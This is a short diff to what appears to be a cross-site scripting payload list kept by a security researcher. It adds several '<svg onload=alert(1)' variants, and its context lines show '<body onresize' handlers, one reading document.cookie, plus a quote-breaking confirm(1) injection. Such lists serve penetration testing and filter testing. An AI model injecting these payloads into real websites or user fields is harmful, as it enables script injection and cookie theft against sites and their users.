@@ -2,7 +2,11 @@
                                                                     https://twitter.com/zapstiko
                                                                 https://www.linkedin.com/in/zapstiko/
                                                                          𝔼𝕧𝕖𝕣𝕪𝕕𝕒𝕪 𝕌𝕡𝕕𝕒𝕥𝕖𝕕
-
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
 <body onresize="alert(/test/)">
 <body onresize="alert(document.cookie)">
 : \');confirm(1);//
